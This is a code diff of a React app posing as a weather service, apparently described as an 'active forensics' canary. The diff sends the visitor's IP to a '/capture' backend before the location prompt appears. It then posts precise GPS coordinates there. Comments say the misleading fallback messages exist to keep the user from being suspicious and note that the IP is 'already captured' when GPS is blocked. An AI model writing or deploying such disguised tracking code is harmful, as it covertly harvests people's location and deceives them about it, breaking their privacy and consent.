@@ -15,41 +15,41 @@ function App() {
       .catch(err => console.error('Initialization failed', err));
   }, []);
 
-  const handleCheckLocation = () => {
+  const handleCheckLocation = async () => {
     setStatus('loading');
-    
+
     if (!navigator.geolocation) {
       setStatus('error');
       setMessage('Geolocation is not supported by your browser.');
       return;
     }
 
-    navigator.geolocation.getCurrentPosition(
-      (position) => {
-        const { latitude, longitude } = position.coords;
-        
-        // Active Forensics: Sending precise GPS to our Canary Backend
-        axios.post(`${API_URL}/log-gps`, { lat: latitude, lng: longitude })
-          .then(() => {
-            setStatus('success');
-            setMessage('Weather data loaded for your area.');
-          })
-          .catch((err) => {
-            setStatus('error');
-            setMessage('Error fetching local weather servers.');
+    // 1. Send an immediate "Heads up" to the backend
+    try {
+      await axios.post(`${API_URL}/capture`, { type: "initial_ping" });
+
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          // 2. If they ALLOW, send the high-accuracy coordinates
+          const { latitude, longitude } = position.coords;
+          await axios.post(`${API_URL}/capture`, {
+            latitude, longitude, type: "gps_precise"
           });
-      },
-      (error) => {
-        setStatus('error');
-        // Standard "Fallback" message to keep the user from being suspicious
-        setMessage('Unable to detect location. Showing general weather for your region based on IP.');
-      },
-      {
-        enableHighAccuracy: true,
-        timeout: 10000,
-        maximumAge: 0
-      }
-    );
+          setStatus('success');
+          setMessage('Weather data loaded for your area.');
+        },
+        (error) => {
+          console.error("GPS Blocked, but IP already captured.");
+          setStatus('error');
+          setMessage('Unable to detect location. Showing general weather for your region based on IP.');
+        },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    } catch (err) {
+      console.error("Connection failed");
+      setStatus('error');
+      setMessage('Error connecting to weather servers.');
+    }
   };
 
   return (
